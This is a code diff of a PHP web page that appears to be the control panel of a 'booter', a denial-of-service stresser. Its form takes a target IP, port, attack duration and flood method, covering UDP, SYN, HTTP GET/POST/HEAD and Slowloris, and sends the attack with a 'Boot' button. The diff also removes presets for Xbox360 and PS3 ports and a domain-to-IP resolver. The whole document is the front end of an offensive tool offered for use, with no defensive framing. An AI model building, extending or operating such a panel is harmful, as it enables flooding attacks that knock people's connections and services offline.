@@ -141,8 +141,26 @@ function opensite($url)
 										</header>
 
 										<!--Attack Curl Configurations -->
-										<?php
-		if (isset($_POST['attackBtn']))
+										
+										
+										<!-- Tab content -->
+										<section class="tab-content">
+													
+											<!-- Tab #horizontal -->
+											<div class="tab-pane fade in active" id="horizontal">
+											
+												<!-- Grid row -->
+												<div class="row-fluid">
+
+													<article class="span12 data-block data-block-alt">
+														<div class="data-container">
+
+															<section>
+																<form action="" method="POST" class="form-horizontal">
+																	<fieldset>
+																		<legend>Boot</legend>
+																<?php
+if (isset($_POST['attackBtn']))
 		{
 			$host = $_POST['host'];
 			$port = intval($_POST['port']);
@@ -189,8 +207,6 @@ function opensite($url)
 						
 						
 							opensite("");
-
-						
 						
 					}
 					else
@@ -213,6 +229,8 @@ function opensite($url)
 				echo '</div>';
 		}
 		}
+
+
 				if (isset($_POST['stopBtn']))
 		{
 		
@@ -233,107 +251,50 @@ function opensite($url)
 		
 		}
 		?>
-										
-										
-										<!-- Tab content -->
-										<section class="tab-content">
-													
-											<!-- Tab #horizontal -->
-											<div class="tab-pane fade in active" id="horizontal">
-											
-												<!-- Grid row -->
-												<div class="row-fluid">
-
-													<article class="span12 data-block data-block-alt">
-														<div class="data-container">
-
-															<section>
-																<form class="form-horizontal">
-																	<fieldset>
-																		<legend>Boot</legend>
 																		<div class="control-group">
-																			<label class="control-label" for="input">Target IP</label>
+																			<label class="control-label" for="host">Target IP</label>
 																			<div class="controls">
-																				<input id="input" class="input-xlarge" type="text">
-																				<p class="help-block">The IP to Attack</p>
+																				<input type="text" maxlength= "15" name="host" />
+																				<p class="help-block">The IP to flood</p>
 																			</div>
 																		</div>
 																		<div class="control-group">
-																			<label class="control-label" for="input">Port</label>
-																			<div class="formRow">
-																			<select name="portSelect" onchange="this.form.elements['port'].value=this.value">
-																			<option value="">Select A Preset Port</option>
-																			<option value="80">Home Connection: (80) </option>
-																			<option value="3074">Xbox360: (3074)</option>
-																			<option value="3478">PS3: (3478)</option>
-																			</select>
+																			<label class="control-label" for="port">Port</label>
+																			<div class="controls">
+																				<input type="text" name="port" value="" />
+																				<p class="help-block">The port to flood</p>
 																			</div>
 																		</div>
 																		<div class="control-group">
-																			<label class="control-label" for="input">Time</label>
+																			<label class="control-label" for="time">Time</label>
 																			<div class="controls">
-																				<input id="input" class="input-xlarge" type="text">
+																				<input type="text" name="time" value="" />
 																				<p class="help-block">How long should we attack</p>
 																			</div>
 																		</div>																		
-																		<div class="row">
-      <label for="method"></label>
-
-                  <div class="formRow">
-                        <label for="labelFor">Method</label>
-                        <div class="formRight">
-       <select name=method id=method>
-<optgroup label="Layer-4">
-                                <option value="udp" selected>UDP</option>
+																		<div class="control-group">
+																			<label class="control-label" for="method">Method</label>
+																			<div class="controls">
+		<select name="method" id="method">
+ 							<optgroup label="Layer-4">
+                               <option value="udp" selected>UDP</option>
+                               <option value="udplag">UDP-LAG</option>
                                 <option value="ssyn">SSYN</option>
 								<option value="udp-lag">UDP-LAG</option>
-                              </optgroup>
-                            
-                              <optgroup label="Layer-7">
-                                  <option value="rudy">RUDY</option>
-                                  <option value="arme">ARME</option>
-                                  <option value="get">GET</option>
-                                  <option value="head">HEAD</option>
-                                  <option value="post">POST</option>
-                                  <option value="slow">SLOWLORIS</option>
-								  <option value="essyn">ESSYN</option>
-                              </optgroup>
-       </select>
-      </div>
-																		<!--Attack and stop button -->
-																		<div class="form-actions">
-																			<button class="btn btn-alt btn-large btn-primary" type="submit" name="attackBtn">Send Attack</button>
-																			<button class="btn btn-alt btn-large btn-danger" type="submit" name="stopBtn">Stop Attack</button>
+                            </optgroup>
+                             
+                            <optgroup label="Layer-7">
+                                   <option value="head">HEAD</option>
+                                   <option value="post">POST</option>
+                                   <option value="slow">SLOWLORIS</option>
+					               <option value="essyn">ESSYN</option>
+                            </optgroup>
+        </select>
+																			</div>
 																		</div>
-																		
-																		<!--Domain To IP RESOLVER -->
-																		<?php 
-		$resolved = '';
-		$domain = '';
-		if (isset($_POST['resolveBtn']))
-		{
-			$domain = $_POST['domain'];
-			$resolved = gethostbyname($domain);
-		}
-		?>
-		<form action="" class="form" method="POST">
-            <fieldset>
-                <div class="widget">
-                    <div class="title"><h6>Host To IP</h6></div>
-                    <div class="formRow">
-                        <label>Domain Name</label>
-                        <div class="formRight"><input type="text" name="domain" value="<?php echo $domain; ?>"/></div>
-                        <div class="clear"></div>
-                    </div>
-					<div class="formRow">
-						<?php echo $resolved;?>
-						<input type="submit" value="Resolve" name="resolveBtn" class="btn btn-alt btn-large btn-primary" />
-						<div class="clear"></div>
-                    </div>
-                </div>
-            </fieldset>
-        </form> 
-																		
+																		<div class="form-actions">
+																			<button class="btn btn-alt btn-large btn-primary" name="attackBtn" type="submit">Boot</button>
+																		</div>
 																	</fieldset>
 																</form>
 															</section>
